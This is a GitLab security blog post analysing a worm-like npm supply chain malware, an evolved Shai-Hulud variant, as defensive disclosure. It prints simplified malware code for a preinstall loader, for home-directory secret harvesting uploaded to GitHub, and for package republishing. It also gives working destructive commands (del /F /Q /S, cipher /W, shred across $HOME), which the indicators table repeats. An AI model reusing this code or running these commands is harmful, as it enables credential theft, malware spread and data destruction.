---
author: about.gitlab.com
cover_image: >-
  https://res.cloudinary.com/about-gitlab-com/image/upload/v1749665667/Blog/Hero%20Images/built-in-security.jpg
date: '2025-11-28T02:39:40.882Z'
dateFolder: 2025/11/27
description: Malware driving attack includes "dead man's switch" that can harm user data.
isBasedOn: >-
  https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
link: >-
  https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
slug: >-
  2025-11-27-httpsaboutgitlabcombloggitlab-discovers-widespread-npm-supply-chain-attack
tags:
  - infosec
title: GitLab discovers widespread npm supply chain attack
---
<figure><img alt="" data-nuxt-img="" data-v-c2e0a90b="" src="https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto,c_lfill/v1749665667/Blog/Hero%20Images/built-in-security.jpg" srcset="https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto,c_lfill/v1749665667/Blog/Hero%20Images/built-in-security.jpg 1x, https://res.cloudinary.com/about-gitlab-com/image/upload/f_auto,q_auto,c_lfill/v1749665667/Blog/Hero%20Images/built-in-security.jpg 2x"/></figure>
<p>GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the "<a href="https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem">Shai-Hulud</a>" malware.</p>
<p>Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a "<strong>dead man's switch</strong>" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed.</p>
<p><strong>We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively.</strong></p>
<h2>Inside the attack </h2>
<p>Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that:</p>
<ul> <li>Harvests credentials from GitHub, npm, AWS, GCP, and Azure</li> <li>Exfiltrates stolen data to attacker-controlled GitHub repositories</li> <li>Propagates by automatically infecting other packages owned by victims</li> <li><strong>Contains a destructive payload that triggers if the malware loses access to its infrastructure</strong></li> </ul>
<p>While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign.</p>
<h2>Technical analysis: How the attack unfolds </h2>
<figure><img alt="mermaid chart of how the attack unfolds" src="https://res.cloudinary.com/about-gitlab-com/image/upload/v1764040799/igbsaqqvlwjqbrnxmh8k.png"/><figcaption>mermaid chart of how the attack unfolds</figcaption></figure>
<p>The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified <code>package.json</code> with a preinstall script pointing to <code>setup_bun.js</code>. This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment.</p>
<pre><code>// This file gets added to victim's packages as setup_bun.js
#!/usr/bin/env node
async function downloadAndSetupBun() {
  // Downloads and installs bun
  let command = process.platform === 'win32' 
    ? 'powershell -c "irm bun.sh/install.ps1|iex"'
    : 'curl -fsSL https://bun.sh/install | bash';
  
  execSync(command, { stdio: 'ignore' });
  
  // Runs the actual malware
  runExecutable(bunPath, ['bun_environment.js']);
}
</code></pre>
<p>The <code>setup_bun.js</code> loader downloads or locates the Bun runtime on the system, then executes the bundled <code>bun_environment.js</code> payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection.</p>
<h3>Credential harvesting </h3>
<p>Once executed, the malware immediately begins credential discovery across multiple sources:</p>
<ul> <li><strong>GitHub tokens</strong>: Searches environment variables and GitHub CLI configurations for tokens starting with <code>ghp_</code> (GitHub personal access token) or <code>gho_</code>(GitHub OAuth token)</li> <li><strong>Cloud credentials</strong>: Enumerates AWS, GCP, and Azure credentials using official SDKs, checking environment variables, config files, and metadata services</li> <li><strong>npm tokens</strong>: Extracts tokens for package publishing from <code>.npmrc</code> files and environment variables, which are common locations for securely storing sensitive configuration and credentials.</li> <li><strong>Filesystem scanning</strong>: Downloads and executes Trufflehog, a legitimate security tool, to scan the entire home directory for API keys, passwords, and other secrets hidden in configuration files, source code, or git history</li> </ul>
<pre><code>async function scanFilesystem() {
  let scanner = new Trufflehog();
  await scanner.initialize();
  
  // Scan user's home directory for secrets
  let findings = await scanner.scanFilesystem(os.homedir());
  
  // Upload findings to exfiltration repo
  await github.saveContents("truffleSecrets.json", 
    JSON.stringify(findings));
}
</code></pre>
<p>The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: "Sha1-Hulud: The Second Coming." These repositories serve as dropboxes for stolen credentials and system information.</p>
<pre><code>async function createRepo(name) {
  // Creates a repository with a specific description marker
  let repo = await this.octokit.repos.createForAuthenticatedUser({
    name: name,
    description: "Sha1-Hulud: The Second Coming.", // Marker for finding repos later
    private: false,
    auto_init: false,
    has_discussions: true
  });
  
  // Install GitHub Actions runner for persistence
  if (await this.checkWorkflowScope()) {
    let token = await this.octokit.request(
      "POST /repos/{owner}/{repo}/actions/runners/registration-token"
    );
    await installRunner(token); // Installs self-hosted runner
  }
  
  return repo;
}
</code></pre>
<p>Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens.</p>
<pre><code>// How the malware network shares tokens:
async fetchToken() {
  // Search GitHub for repos with the identifying marker
  let results = await this.octokit.search.repos({
    q: '"Sha1-Hulud: The Second Coming."',
    sort: "updated"
  });
  
  // Try to retrieve tokens from compromised repos
  for (let repo of results) {
    let contents = await fetch(
      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`
    );
    
    let data = JSON.parse(Buffer.from(contents, 'base64').toString());
    let token = data?.modules?.github?.token;
    
    if (token &amp;&amp; await validateToken(token)) {
      return token;  // Use token from another infected system
    }
  }
  return null;  // No valid tokens found in network
}
</code></pre>
<p>Using stolen npm tokens, the malware:</p>
<ol> <li>Downloads all packages maintained by the victim</li> <li>Injects the <code>setup_bun.js</code> loader into each package's preinstall scripts</li> <li>Bundles the malicious <code>bun_environment.js</code> payload</li> <li>Increments the package version number</li> <li>Republishes the infected packages to npm</li> </ol>
<pre><code>async function updatePackage(packageInfo) {
  // Download original package
  let tarball = await fetch(packageInfo.tarballUrl);
  
  // Extract and modify package.json
  let packageJson = JSON.parse(await readFile("package.json"));
  
  // Add malicious preinstall script
  packageJson.scripts.preinstall = "node setup_bun.js";
  
  // Increment version
  let version = packageJson.version.split(".").map(Number);
  version[2] = (version[2] || 0) + 1;
  packageJson.version = version.join(".");
  
  // Bundle backdoor installer
  await writeFile("setup_bun.js", BACKDOOR_CODE);
  
  // Repackage and publish
  await Bun.$`npm publish ${modifiedPackage}`.env({
    NPM_CONFIG_TOKEN: this.token
  });
}
</code></pre>
<h2>The dead man's switch </h2>
<p>Our analysis uncovered a destructive payload designed to protect the malware’s infrastructure against takedown attempts.</p>
<p>The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses <code>shred</code> to overwrite files before deletion, making recovery nearly impossible.</p>
<pre><code>// CRITICAL: Token validation failure triggers destruction
async function aL0() {
  let githubApi = new dq();
  let npmToken = process.env.NPM_TOKEN || await findNpmToken();
  
  // Try to find or create GitHub access
  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {
    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos
    
    if (!fetchedToken) {  // No GitHub access possible
      if (npmToken) {
        // Fallback to NPM propagation only
        await El(npmToken);
      } else {
        // DESTRUCTION TRIGGER: No GitHub AND no NPM access
        console.log("Error 12");
        if (platform === "windows") {
          // Attempts to delete all user files and overwrite disk sectors
          Bun.spawnSync(["cmd.exe", "/c", 
            "del /F /Q /S \"%USERPROFILE%*\" &amp;&amp; " +
            "for /d %%i in (\"%USERPROFILE%*\") do rd /S /Q \"%%i\" &amp; " +
            "cipher /W:%USERPROFILE%"  // Overwrite deleted data
          ]);
        } else {
          // Attempts to shred all writable files in home directory
          Bun.spawnSync(["bash", "-c", 
            "find \"$HOME\" -type f -writable -user \"$(id -un)\" -print0 | " +
            "xargs -0 -r shred -uvz -n 1 &amp;&amp; " +  // Overwrite and delete
            "find \"$HOME\" -depth -type d -empty -delete"  // Remove empty dirs
          ]);
        }
        process.exit(0);
      }
    }
  }
}
</code></pre>
<p>This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user’s data when a takedown is detected.</p>
<h2>Indicators of compromise </h2>
<p>To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis.</p>
<table> <tr> <th>Type</th> <th>Indicator</th> <th>Description</th> </tr> <tbody> <tr> <td><strong>file</strong></td> <td><code>bun_environment.js</code></td> <td>Malicious post-install script in node_modules directories</td> </tr> <tr> <td><strong>directory</strong></td> <td><code>.truffler-cache/</code></td> <td>Hidden directory created in user home for Trufflehog binary storage</td> </tr> <tr> <td><strong>directory</strong></td> <td><code>.truffler-cache/extract/</code></td> <td>Temporary directory used for binary extraction</td> </tr> <tr> <td><strong>file</strong></td> <td><code>.truffler-cache/trufflehog</code></td> <td>Downloaded Trufflehog binary (Linux/Mac)</td> </tr> <tr> <td><strong>file</strong></td> <td><code>.truffler-cache/trufflehog.exe</code></td> <td>Downloaded Trufflehog binary (Windows)</td> </tr> <tr> <td><strong>process</strong></td> <td><code>del /F /Q /S "%USERPROFILE%*"</code></td> <td>Windows destructive payload command</td> </tr> <tr> <td><strong>process</strong></td> <td><code>shred -uvz -n 1</code></td> <td>Linux/Mac destructive payload command</td> </tr> <tr> <td><strong>process</strong></td> <td><code>cipher /W:%USERPROFILE%</code></td> <td>Windows secure deletion command in payload</td> </tr> <tr> <td><strong>command</strong></td> <td><code>curl -fsSL https://bun.sh/install | bash</code></td> <td>Suspicious Bun installation during NPM package install</td> </tr> <tr> <td><strong>command</strong></td> <td><code>powershell -c "irm bun.sh/install.ps1|iex"</code></td> <td>Windows Bun installation via PowerShell</td> </tr> </tbody> </table>
<h2>Looking ahead </h2>
<p>This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies.</p>
<p>GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.</p>
